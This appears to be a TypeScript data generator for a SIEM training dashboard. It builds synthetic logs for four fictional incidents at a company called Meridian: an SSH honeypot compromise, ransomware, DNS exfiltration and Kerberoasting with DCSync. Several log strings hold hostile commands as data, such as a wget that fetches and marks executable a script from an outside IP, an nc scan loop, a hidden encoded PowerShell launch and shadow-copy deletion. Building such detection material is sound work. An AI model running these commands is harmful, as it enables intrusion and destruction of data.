import type { Severity, SiemEvent, SourceKind } from "./types";
import { ATTACKS } from "./attacks";
import { HASHES } from "./intel";

const WORKSTATIONS = [
  { host: "FIN-WS-14", user: "MERIDIAN\\j.chen", ip: "10.10.20.44" },
  { host: "HR-LAP-07", user: "MERIDIAN\\r.okonkwo", ip: "10.10.30.19" },
  { host: "DEV-WS-03", user: "MERIDIAN\\a.rossi", ip: "10.10.40.8" },
  { host: "CORP-WS-21", user: "MERIDIAN\\m.patel", ip: "10.10.20.61" },
  { host: "CORP-WS-08", user: "MERIDIAN\\l.nguyen", ip: "10.10.20.18" },
  { host: "FIN-WS-02", user: "MERIDIAN\\s.okada", ip: "10.10.20.32" },
];

const EXT = [
  "8.8.8.8",
  "1.1.1.1",
  "13.107.42.14",
  "52.84.12.10",
  "142.250.185.14",
  "20.42.64.25",
  "104.16.132.229",
  "3.233.158.15",
];

function mulberry32(seed: number) {
  return () => {
    let t = (seed += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function iso(day: number, h: number, m: number, s: number, ms = 0) {
  return new Date(Date.UTC(2026, 9, day, h, m, s, ms)).toISOString();
}

let seq = 0;
function id() {
  seq += 1;
  return `evt-${String(seq).padStart(4, "0")}`;
}

function ev(partial: Omit<SiemEvent, "id">): SiemEvent {
  return { id: id(), ...partial };
}

function panTraffic(opts: {
  ts: string;
  src: string;
  dst: string;
  dport: number;
  sport?: number;
  action: string;
  app: string;
  rule: string;
  bytes: number;
  severity?: Severity;
  incidentId?: string;
  notable?: boolean;
  mitre?: string[];
  extra?: string;
}): SiemEvent {
  const sport = opts.sport ?? 40000 + Math.floor((opts.dport * 17) % 20000);
  const type = opts.action === "deny" || opts.action === "drop" ? "THREAT" : "TRAFFIC";
  return ev({
    ts: opts.ts,
    source: "firewall",
    sourcetype: type === "THREAT" ? "pan:threat" : "pan:traffic",
    index: "network",
    host: "FW-EDGE-01",
    severity: opts.severity ?? (opts.action === "deny" ? "low" : "info"),
    action: opts.action,
    srcIp: opts.src,
    destIp: opts.dst,
    destPort: opts.dport,
    srcPort: sport,
    app: opts.app,
    bytesOut: opts.bytes,
    incidentId: opts.incidentId,
    notable: opts.notable,
    mitre: opts.mitre,
    raw: `${opts.ts} FW-EDGE-01 ${type} src=${opts.src} dst=${opts.dst} sport=${sport} dport=${opts.dport} app=${opts.app} action=${opts.action} bytes=${opts.bytes} rule=${opts.rule} device=PA-3220${opts.extra ? ` ${opts.extra}` : ""}`,
  });
}

function cowrie(opts: {
  ts: string;
  src: string;
  msg: string;
  severity: Severity;
  user?: string;
  action?: string;
  notable?: boolean;
  mitre?: string[];
  destPort?: number;
}): SiemEvent {
  return ev({
    ts: opts.ts,
    source: "honeypot",
    sourcetype: "cowrie",
    index: "honeypot",
    host: "HPOT-SSH-01",
    severity: opts.severity,
    user: opts.user,
    srcIp: opts.src,
    destIp: "10.50.1.20",
    destPort: opts.destPort ?? 22,
    action: opts.action,
    notable: opts.notable,
    mitre: opts.mitre,
    incidentId: "night-latch",
    raw: `${opts.ts.replace("T", " ").replace(".000Z", "")} HPOT-SSH-01 cowrie: ${opts.msg}`,
  });
}

function win(opts: {
  ts: string;
  host: string;
  eventCode: string;
  raw: string;
  severity: Severity;
  user?: string;
  srcIp?: string;
  destIp?: string;
  process?: string;
  action?: string;
  incidentId?: string;
  notable?: boolean;
  mitre?: string[];
}): SiemEvent {
  return ev({
    ts: opts.ts,
    source: "system",
    sourcetype: opts.eventCode.startsWith("1") && opts.eventCode.length <= 2 ? "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" : "WinEventLog:Security",
    index: "winevent",
    host: opts.host,
    eventCode: opts.eventCode,
    severity: opts.severity,
    user: opts.user,
    srcIp: opts.srcIp,
    destIp: opts.destIp,
    process: opts.process,
    action: opts.action,
    incidentId: opts.incidentId,
    notable: opts.notable,
    mitre: opts.mitre,
    raw: opts.raw,
  });
}

function nightLatch(): SiemEvent[] {
  const out: SiemEvent[] = [];
  const users = ["root", "admin", "ubuntu", "pi", "oracle", "test", "postgres", "merlin"];
  const passwords = ["123456", "password", "admin", "toor", "changeme", "letmein", "qwerty", "Summer2024!"];

  out.push(
    panTraffic({
      ts: iso(1, 1, 12, 4),
      src: "185.220.101.47",
      dst: "10.50.1.20",
      dport: 22,
      action: "allow",
      app: "ssh",
      rule: "DMZ-HONEYPOT-IN",
      bytes: 480,
      severity: "low",
      incidentId: "night-latch",
      extra: "session=start threatid=brute-force-suspect",
    }),
  );

  let attempt = 0;
  for (let min = 12; min <= 36; min += 3) {
    for (let burst = 0; burst < 3; burst++) {
      const user = users[(min + burst) % users.length];
      const pass = passwords[(min + burst) % (passwords.length - 1)];
      attempt += 140 + ((min * 3 + burst) % 90);
      out.push(
        cowrie({
          ts: iso(1, 1, min, 8 + burst * 11),
          src: burst === 2 ? "185.220.102.8" : "185.220.101.47",
          user,
          action: "failed",
          severity: "low",
          mitre: ["T1110.001"],
          msg: `[SSH] login attempt [${user}/${pass}] failed from ${burst === 2 ? "185.220.102.8" : "185.220.101.47"}:${44122 + burst} (campaign_failures=${attempt})`,
        }),
      );
    }
  }

  out.push(
    cowrie({
      ts: iso(1, 2, 37, 11),
      src: "185.220.101.47",
      user: "admin",
      action: "success",
      severity: "high",
      notable: true,
      mitre: ["T1110.001", "T1078"],
      msg: "[SSH] login attempt [admin/Summer2024!] succeeded from 185.220.101.47:44190 session=c0wrie-9f2a",
    }),
    cowrie({
      ts: iso(1, 2, 37, 44),
      src: "185.220.101.47",
      user: "admin",
      action: "command",
      severity: "medium",
      mitre: ["T1059.004"],
      msg: "[SSH] CMD: uname -a ; id ; cat /etc/passwd (session=c0wrie-9f2a)",
    }),
    cowrie({
      ts: iso(1, 2, 38, 19),
      src: "185.220.101.47",
      user: "admin",
      action: "command",
      severity: "high",
      mitre: ["T1105", "T1059.004"],
      msg: "[SSH] CMD: wget -q http://91.215.85.22/ld.sh -O /tmp/.x ; chmod +x /tmp/.x (session=c0wrie-9f2a)",
    }),
    cowrie({
      ts: iso(1, 2, 39, 2),
      src: "185.220.101.47",
      user: "admin",
      action: "command",
      severity: "high",
      notable: true,
      mitre: ["T1046"],
      msg: "[SSH] CMD: for h in 10.10.1.{1..20}; do nc -z -w1 $h 445 22 3389; done (session=c0wrie-9f2a)",
    }),
    panTraffic({
      ts: iso(1, 2, 39, 6),
      src: "10.50.1.20",
      dst: "10.10.1.10",
      dport: 445,
      action: "deny",
      app: "ms-ds-smb",
      rule: "DENY-DMZ-TO-SERVERS",
      bytes: 64,
      severity: "high",
      incidentId: "night-latch",
      notable: true,
      mitre: ["T1046", "T1021.002"],
      extra: "reason=policy threatid=lateral-probe",
    }),
    panTraffic({
      ts: iso(1, 2, 39, 7),
      src: "10.50.1.20",
      dst: "10.10.1.10",
      dport: 3389,
      action: "deny",
      app: "ms-rdp",
      rule: "DENY-DMZ-TO-SERVERS",
      bytes: 48,
      severity: "medium",
      incidentId: "night-latch",
      mitre: ["T1046"],
    }),
    cowrie({
      ts: iso(1, 2, 41, 18),
      src: "185.220.101.47",
      user: "admin",
      action: "disconnect",
      severity: "medium",
      msg: "[SSH] Connection lost after 247s session=c0wrie-9f2a commands=11 downloads=1",
    }),
  );
  return out;
}

function ledgerlock(): SiemEvent[] {
  const host = "FIN-WS-14";
  const user = "MERIDIAN\\j.chen";
  const inc = "ledgerlock";
  return [
    win({
      ts: iso(1, 9, 4, 41),
      host,
      user,
      eventCode: "1",
      process: "WINWORD.EXE",
      severity: "medium",
      incidentId: inc,
      mitre: ["T1566.001", "T1204.002"],
      raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=1 Computer=${host} User=${user} Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine="WINWORD.EXE" /n "C:\\Users\\j.chen\\Downloads\\Q3_Invoice_ACH.xlsm" ParentImage=C:\\Windows\\explorer.exe`,
    }),
    win({
      ts: iso(1, 9, 7, 2),
      host,
      user,
      eventCode: "4688",
      process: "powershell.exe",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1059.001"],
      action: "created",
      raw: `LogName=Security EventCode=4688 Computer=${host} Subject=${user} NewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE`,
    }),
    panTraffic({
      ts: iso(1, 9, 8, 11),
      src: "10.10.20.44",
      dst: "91.215.85.22",
      dport: 443,
      action: "allow",
      app: "ssl",
      rule: "USERS-TO-INTERNET",
      bytes: 2483312,
      severity: "high",
      incidentId: inc,
      notable: true,
      mitre: ["T1105"],
      extra: "sni=cdn-upd.91-215-85-22.nip.io threatid=unknown-binary",
    }),
    win({
      ts: iso(1, 9, 8, 18),
      host,
      user,
      eventCode: "11",
      process: "powershell.exe",
      severity: "high",
      incidentId: inc,
      mitre: ["T1105"],
      raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=11 Computer=${host} Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetFilename=C:\\Users\\j.chen\\AppData\\Roaming\\upd.exe Hash=SHA256=${HASHES.ledgerlock} CreationUtcTime=${iso(1, 9, 8, 18)}`,
    }),
    win({
      ts: iso(1, 9, 9, 1),
      host,
      user,
      eventCode: "4688",
      process: "vssadmin.exe",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1490"],
      raw: `LogName=Security EventCode=4688 Computer=${host} Subject=${user} NewProcessName=C:\\Windows\\System32\\vssadmin.exe CommandLine=vssadmin.exe delete shadows /all /quiet ParentProcessName=C:\\Users\\j.chen\\AppData\\Roaming\\upd.exe`,
    }),
    win({
      ts: iso(1, 9, 9, 4),
      host,
      user,
      eventCode: "4688",
      process: "wbadmin.exe",
      severity: "critical",
      incidentId: inc,
      mitre: ["T1490"],
      raw: `LogName=Security EventCode=4688 Computer=${host} Subject=${user} NewProcessName=C:\\Windows\\System32\\wbadmin.exe CommandLine=wbadmin.exe delete catalog -quiet ParentProcessName=C:\\Users\\j.chen\\AppData\\Roaming\\upd.exe`,
    }),
    win({
      ts: iso(1, 9, 9, 6),
      host,
      user,
      eventCode: "4688",
      process: "bcdedit.exe",
      severity: "high",
      incidentId: inc,
      mitre: ["T1490"],
      raw: `LogName=Security EventCode=4688 Computer=${host} Subject=${user} NewProcessName=C:\\Windows\\System32\\bcdedit.exe CommandLine=bcdedit.exe /set {default} recoveryenabled no ParentProcessName=C:\\Users\\j.chen\\AppData\\Roaming\\upd.exe`,
    }),
    win({
      ts: iso(1, 9, 10, 22),
      host,
      user,
      eventCode: "11",
      process: "upd.exe",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1486"],
      action: "encrypted",
      raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=11 Computer=${host} Image=C:\\Users\\j.chen\\AppData\\Roaming\\upd.exe TargetFilename=C:\\Users\\j.chen\\Documents\\Q3_close\\ledger_pack.xlsx.ledgerlock Count=847 note=mass_rename_extension=.ledgerlock`,
    }),
    panTraffic({
      ts: iso(1, 9, 11, 3),
      src: "10.10.20.44",
      dst: "10.10.2.15",
      dport: 445,
      action: "allow",
      app: "ms-ds-smb",
      rule: "FINANCE-TO-FILESERVER",
      bytes: 184220000,
      severity: "critical",
      incidentId: inc,
      notable: true,
      mitre: ["T1080", "T1486"],
      extra: "share=\\\\FIN-FS-01\\finance files_modified=3381",
    }),
    win({
      ts: iso(1, 9, 11, 40),
      host: "FIN-FS-01",
      user,
      eventCode: "4663",
      severity: "critical",
      incidentId: inc,
      mitre: ["T1486"],
      raw: `LogName=Security EventCode=4663 Computer=FIN-FS-01 Subject=${user} ObjectName=D:\\shares\\finance\\Q3_close\\ AccessMask=0x2 ProcessName=System note=burst_write_3381_files extension=.ledgerlock`,
    }),
    win({
      ts: iso(1, 9, 12, 5),
      host,
      user,
      eventCode: "11",
      process: "upd.exe",
      severity: "critical",
      incidentId: inc,
      mitre: ["T1486"],
      raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=11 Computer=${host} Image=C:\\Users\\j.chen\\AppData\\Roaming\\upd.exe TargetFilename=C:\\Users\\j.chen\\Desktop\\LEDGERLOCK_README.txt Contents="Your files are encrypted. Contact decrypt@onionmail.invalid. ID MER-14-9F2A."`,
    }),
    panTraffic({
      ts: iso(1, 9, 14, 8),
      src: "10.10.20.44",
      dst: "91.215.85.22",
      dport: 443,
      action: "allow",
      app: "ssl",
      rule: "USERS-TO-INTERNET",
      bytes: 4096,
      severity: "high",
      incidentId: inc,
      mitre: ["T1105"],
      extra: "sni=91.215.85.22 beacon=true",
    }),
    panTraffic({
      ts: iso(1, 9, 18, 44),
      src: "10.10.20.44",
      dst: "91.215.85.22",
      dport: 443,
      action: "deny",
      app: "ssl",
      rule: "SOC-EMERGENCY-BLOCK",
      bytes: 0,
      severity: "medium",
      incidentId: inc,
      extra: "reason=analyst-block isolate=FIN-WS-14",
    }),
    win({
      ts: iso(1, 9, 22, 8),
      host,
      user: "MERIDIAN\\soc.admin",
      eventCode: "6006",
      severity: "info",
      incidentId: inc,
      action: "isolated",
      raw: `LogName=System EventCode=6006 Computer=${host} Message=FIN-WS-14 removed from VLAN by NAC isolate request. upd.exe terminated. Share mapping to FIN-FS-01 dropped.`,
    }),
  ];
}

function silentSiphon(): SiemEvent[] {
  const out: SiemEvent[] = [];
  const inc = "silent-siphon";
  const host = "HR-LAP-07";
  const user = "MERIDIAN\\r.okonkwo";

  out.push(
    win({
      ts: iso(1, 11, 2, 19),
      host,
      user,
      eventCode: "1",
      process: "updater.exe",
      severity: "high",
      notable: true,
      incidentId: inc,
      mitre: ["T1036.005"],
      raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=1 Computer=${host} User=${user} Image=C:\\Users\\r.okonkwo\\AppData\\Roaming\\updater.exe Hash=SHA256=${HASHES.updater} Signed=false OriginalFileName=svchost.exe ParentImage=C:\\Windows\\explorer.exe`,
    }),
  );

  const hours = [11, 12, 13, 14, 15, 16];
  hours.forEach((h, i) => {
    const bytes = 1800000 * (i + 1) * (i + 2);
    const q = 118 + i * 96;
    const sub = `n${(h * 17 + 4).toString(16)}a${i}.upd-cdn.services`;
    out.push(
      panTraffic({
        ts: iso(1, h, 14, 20),
        src: "10.10.30.19",
        dst: "10.10.1.8",
        dport: 53,
        action: "allow",
        app: "dns",
        rule: "USERS-DNS",
        bytes,
        severity: i >= 3 ? "high" : "medium",
        incidentId: inc,
        notable: i === 5,
        mitre: ["T1071.004", "T1048.003", "T1020"],
        extra: `query=${sub} qtype=TXT count=${q} bytes_txt=${bytes} parent=upd-cdn.services`,
      }),
    );
    out.push(
      win({
        ts: iso(1, h, 14, 22),
        host,
        user,
        eventCode: "22",
        process: "updater.exe",
        severity: i >= 3 ? "high" : "medium",
        incidentId: inc,
        mitre: ["T1071.004"],
        raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=22 Computer=${host} Image=C:\\Users\\r.okonkwo\\AppData\\Roaming\\updater.exe QueryName=${sub} QueryResults=TXT len=${Math.round(bytes / q)} note=high_entropy`,
      }),
    );
  });

  out.push(
    panTraffic({
      ts: iso(1, 15, 41, 9),
      src: "10.10.30.19",
      dst: "185.199.108.153",
      dport: 443,
      action: "allow",
      app: "ssl",
      rule: "USERS-TO-INTERNET",
      bytes: 734003200,
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1567.002"],
      extra: "sni=upd-cdn.services method=POST path=/ingest/hris size=700MB",
    }),
    win({
      ts: iso(1, 16, 12, 44),
      host,
      user,
      eventCode: "11",
      process: "updater.exe",
      severity: "high",
      incidentId: inc,
      mitre: ["T1020"],
      raw: `LogName=Microsoft-Windows-Sysmon/Operational EventCode=11 Computer=${host} Image=C:\\Users\\r.okonkwo\\AppData\\Roaming\\updater.exe TargetFilename=C:\\Users\\r.okonkwo\\AppData\\Local\\Temp\\hris_full_20260930.csv.b64 note=staging_for_exfil records=42118`,
    }),
    panTraffic({
      ts: iso(1, 16, 48, 33),
      src: "10.10.30.19",
      dst: "10.10.1.8",
      dport: 53,
      action: "deny",
      app: "dns",
      rule: "SOC-RPZ-SINKHOLE",
      bytes: 0,
      severity: "medium",
      incidentId: inc,
      extra: "query=upd-cdn.services action=sinkhole",
    }),
  );
  return out;
}

function ticketForge(): SiemEvent[] {
  const inc = "ticket-forge";
  return [
    win({
      ts: iso(1, 13, 40, 12),
      host: "VPN-GW",
      user: "MERIDIAN\\d.park",
      eventCode: "4624",
      srcIp: "32.87.12.4",
      severity: "info",
      incidentId: inc,
      action: "logon",
      raw: `LogName=Security EventCode=4624 Computer=VPN-GW TargetUserName=d.park LogonType=3 IpAddress=32.87.12.4 WorkstationName=NYC-HOME-DP AuthenticationPackage=RADIUS geo=US-NY`,
    }),
    win({
      ts: iso(1, 14, 18, 6),
      host: "VPN-GW",
      user: "MERIDIAN\\d.park",
      eventCode: "4624",
      srcIp: "45.142.150.19",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1078.002"],
      action: "logon",
      raw: `LogName=Security EventCode=4624 Computer=VPN-GW TargetUserName=d.park LogonType=3 IpAddress=45.142.150.19 WorkstationName=UNKNOWN AuthenticationPackage=RADIUS geo=MD-CHISINAU note=impossible_travel_38m from=32.87.12.4`,
    }),
    panTraffic({
      ts: iso(1, 14, 18, 8),
      src: "45.142.150.19",
      dst: "10.10.1.5",
      dport: 443,
      action: "allow",
      app: "ssl",
      rule: "VPN-IN",
      bytes: 92100,
      severity: "high",
      incidentId: inc,
      mitre: ["T1078.002"],
      extra: "user=d.park geo=MD",
    }),
    win({
      ts: iso(1, 14, 22, 31),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\d.park",
      eventCode: "4769",
      srcIp: "10.10.20.44",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1558.003"],
      raw: `LogName=Security EventCode=4769 Computer=MERIDIAN-DC01 TargetUserName=SQLService ServiceName=SQLService TicketEncryptionType=0x17 (RC4-HMAC) IpAddress=10.10.20.44 Status=0x0 note=kerberoastable_spn`,
    }),
    win({
      ts: iso(1, 14, 22, 33),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\d.park",
      eventCode: "4769",
      srcIp: "10.10.20.44",
      severity: "high",
      incidentId: inc,
      mitre: ["T1558.003"],
      raw: `LogName=Security EventCode=4769 Computer=MERIDIAN-DC01 TargetUserName=HTTP/intranet.meridian.cap ServiceName=HTTP/intranet.meridian.cap TicketEncryptionType=0x17 (RC4-HMAC) IpAddress=10.10.20.44 Status=0x0`,
    }),
    panTraffic({
      ts: iso(1, 14, 22, 34),
      src: "10.10.20.44",
      dst: "10.10.1.10",
      dport: 88,
      action: "allow",
      app: "kerberos",
      rule: "USERS-TO-DC",
      bytes: 2400,
      severity: "medium",
      incidentId: inc,
      extra: "tickets=2 etype=rc4",
    }),
    win({
      ts: iso(1, 14, 44, 10),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\SQLService",
      eventCode: "4624",
      srcIp: "10.10.20.44",
      severity: "high",
      incidentId: inc,
      mitre: ["T1078.002"],
      action: "logon",
      raw: `LogName=Security EventCode=4624 Computer=MERIDIAN-DC01 TargetUserName=SQLService LogonType=3 IpAddress=10.10.20.44 WorkstationName=FIN-WS-14 AuthenticationPackage=Kerberos note=roasted_hash_used`,
    }),
    win({
      ts: iso(1, 14, 48, 19),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\SQLService",
      eventCode: "4662",
      srcIp: "10.10.20.44",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1003.006"],
      raw: `LogName=Security EventCode=4662 Computer=MERIDIAN-DC01 Subject=MERIDIAN\\SQLService ObjectName=DC=meridian,DC=cap Properties=1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 AccessMask=0x100 note=DS-Replication-Get-Changes-All DCSync`,
    }),
    panTraffic({
      ts: iso(1, 14, 48, 20),
      src: "10.10.20.44",
      dst: "10.10.1.10",
      dport: 135,
      action: "allow",
      app: "msrpc",
      rule: "USERS-TO-DC",
      bytes: 12880000,
      severity: "critical",
      incidentId: inc,
      mitre: ["T1003.006"],
      extra: "dcerpc=DRSUAPI opnum=3",
    }),
    win({
      ts: iso(1, 14, 52, 41),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\SQLService",
      eventCode: "4720",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1136.002"],
      raw: `LogName=Security EventCode=4720 Computer=MERIDIAN-DC01 Subject=MERIDIAN\\SQLService NewAccount=svc_backup$ SamAccountName=svc_backup$ UAC=0x1020 note=machine_like_user_account`,
    }),
    win({
      ts: iso(1, 14, 53, 2),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\SQLService",
      eventCode: "4732",
      severity: "critical",
      notable: true,
      incidentId: inc,
      mitre: ["T1136.002"],
      raw: `LogName=Security EventCode=4732 Computer=MERIDIAN-DC01 Subject=MERIDIAN\\SQLService Member=CN=svc_backup$,CN=Users,DC=meridian,DC=cap Group=CN=Domain Admins,CN=Users,DC=meridian,DC=cap`,
    }),
    panTraffic({
      ts: iso(1, 15, 1, 14),
      src: "10.10.20.44",
      dst: "10.10.1.10",
      dport: 3389,
      action: "allow",
      app: "ms-rdp",
      rule: "USERS-TO-DC",
      bytes: 220000,
      severity: "critical",
      incidentId: inc,
      mitre: ["T1021.001"],
      extra: "user=svc_backup$",
    }),
    win({
      ts: iso(1, 15, 1, 16),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\svc_backup$",
      eventCode: "4624",
      srcIp: "10.10.20.44",
      severity: "critical",
      incidentId: inc,
      mitre: ["T1021.001"],
      action: "logon",
      raw: `LogName=Security EventCode=4624 Computer=MERIDIAN-DC01 TargetUserName=svc_backup$ LogonType=10 IpAddress=10.10.20.44 WorkstationName=FIN-WS-14 AuthenticationPackage=Negotiate LogonProcess=User32`,
    }),
    win({
      ts: iso(1, 15, 6, 44),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\soc.admin",
      eventCode: "4725",
      severity: "medium",
      incidentId: inc,
      action: "disabled",
      raw: `LogName=Security EventCode=4725 Computer=MERIDIAN-DC01 Subject=MERIDIAN\\soc.admin Target=svc_backup$ Message=Account disabled by SOC. krbtgt rotation NOT yet performed. Status=ACTIVE residual golden-ticket risk`,
    }),
  ];
}

function baseline(): SiemEvent[] {
  const rng = mulberry32(20261001);
  const out: SiemEvent[] = [];
  const pick = <T,>(arr: T[]) => arr[Math.floor(rng() * arr.length)];

  for (let i = 0; i < 36; i++) {
    const day = i < 28 ? 1 : 2;
    const h = day === 1 ? Math.floor(rng() * 23) : Math.floor(rng() * 16);
    const m = Math.floor(rng() * 60);
    const s = Math.floor(rng() * 60);
    const ws = pick(WORKSTATIONS);
    const dst = pick(EXT);
    const webPort = rng() > 0.15 ? 443 : 80;
    out.push(
      panTraffic({
        ts: iso(day, h, m, s),
        src: ws.ip,
        dst,
        dport: webPort,
        action: "allow",
        app: webPort === 443 ? "ssl" : "web-browsing",
        rule: "USERS-TO-INTERNET",
        bytes: 20000 + Math.floor(rng() * 900000),
      }),
    );
  }

  for (let i = 0; i < 8; i++) {
    out.push(
      panTraffic({
        ts: iso(1, 3 + i, 11, 40),
        src: `45.${20 + i}.8.${10 + i * 3}`,
        dst: "203.0.113.40",
        dport: i % 2 === 0 ? 3389 : 445,
        action: "deny",
        app: i % 2 === 0 ? "ms-rdp" : "ms-ds-smb",
        rule: "DENY-INBOUND-ADMIN",
        bytes: 40,
        severity: "low",
        extra: "inbound_internet_noise",
      }),
    );
  }

  for (let i = 0; i < 22; i++) {
    const ws = pick(WORKSTATIONS);
    const day = i % 5 === 0 ? 2 : 1;
    const h = 7 + (i % 10);
    out.push(
      win({
        ts: iso(day, h, (i * 7) % 60, (i * 13) % 60),
        host: ws.host,
        user: ws.user,
        eventCode: "4624",
        srcIp: ws.ip,
        severity: "info",
        action: "logon",
        raw: `LogName=Security EventCode=4624 Computer=${ws.host} TargetUserName=${ws.user.split("\\")[1]} LogonType=2 IpAddress=${ws.ip} AuthenticationPackage=Negotiate`,
      }),
    );
  }

  const noiseUsers = ["root", "admin", "support", "guest", "test"];
  for (let i = 0; i < 14; i++) {
    const src = `${1 + Math.floor(rng() * 200)}.${Math.floor(rng() * 200)}.${Math.floor(rng() * 200)}.${Math.floor(rng() * 200)}`;
    const user = pick(noiseUsers);
    out.push(
      ev({
        ts: iso(1, 4 + (i % 18), (i * 11) % 60, (i * 17) % 60),
        source: "honeypot",
        sourcetype: "cowrie",
        index: "honeypot",
        host: "HPOT-SSH-01",
        severity: "info",
        user,
        srcIp: src,
        destIp: "10.50.1.20",
        destPort: 22,
        action: "failed",
        raw: `${iso(1, 4 + (i % 18), (i * 11) % 60, (i * 17) % 60).replace("T", " ").replace(".000Z", "")} HPOT-SSH-01 cowrie: [SSH] login attempt [${user}/${pick(["1234", "admin", "pass", "root"])}] failed from ${src}:${22000 + i} (internet_noise)`,
      }),
    );
  }

  out.push(
    win({
      ts: iso(1, 6, 15, 0),
      host: "MERIDIAN-DC01",
      user: "MERIDIAN\\SYSTEM",
      eventCode: "1102",
      severity: "info",
      raw: "LogName=Security EventCode=4625 Computer=MERIDIAN-DC01 TargetUserName=guest IpAddress=10.10.40.8 Status=0xC000006D Message=Failed logon to disabled guest \u2014 routine",
    }),
    panTraffic({
      ts: iso(2, 8, 2, 11),
      src: "10.10.20.61",
      dst: "20.42.64.25",
      dport: 443,
      action: "allow",
      app: "ms-update",
      rule: "USERS-TO-INTERNET",
      bytes: 55400000,
      extra: "windows_update",
    }),
    win({
      ts: iso(2, 7, 55, 3),
      host: "CORP-WS-21",
      user: "MERIDIAN\\m.patel",
      eventCode: "4624",
      severity: "info",
      action: "logon",
      raw: "LogName=Security EventCode=4624 Computer=CORP-WS-21 TargetUserName=m.patel LogonType=2 AuthenticationPackage=Negotiate",
    }),
  );

  return out;
}

function build(): SiemEvent[] {
  const all = [
    ...baseline(),
    ...nightLatch(),
    ...ledgerlock(),
    ...silentSiphon(),
    ...ticketForge(),
  ];
  all.sort((a, b) => a.ts.localeCompare(b.ts) || a.id.localeCompare(b.id));
  return all;
}

export const EVENTS: SiemEvent[] = build();

export const EVENTS_BY_ID = Object.fromEntries(EVENTS.map((e) => [e.id, e]));

export function eventsForAttack(id: string): SiemEvent[] {
  return EVENTS.filter((e) => e.incidentId === id);
}

export function notables(): SiemEvent[] {
  return EVENTS.filter((e) => e.notable);
}

export function sourceStats() {
  const by: Record<SourceKind, number> = { system: 0, honeypot: 0, firewall: 0 };
  for (const e of EVENTS) by[e.source] += 1;
  return by;
}

export function severityStats() {
  const by: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const e of EVENTS) by[e.severity] += 1;
  return by;
}

export function hourlyVolume() {
  const buckets = new Map<string, { hour: string; system: number; honeypot: number; firewall: number; total: number }>();
  for (const e of EVENTS) {
    const hour = e.ts.slice(0, 13) + ":00:00.000Z";
    let row = buckets.get(hour);
    if (!row) {
      row = { hour, system: 0, honeypot: 0, firewall: 0, total: 0 };
      buckets.set(hour, row);
    }
    row[e.source] += 1;
    row.total += 1;
  }
  return [...buckets.values()].sort((a, b) => a.hour.localeCompare(b.hour));
}

export function attackWindow(id: string) {
  const a = ATTACKS.find((x) => x.id === id);
  return a ? { start: a.started, end: a.ended } : null;
}
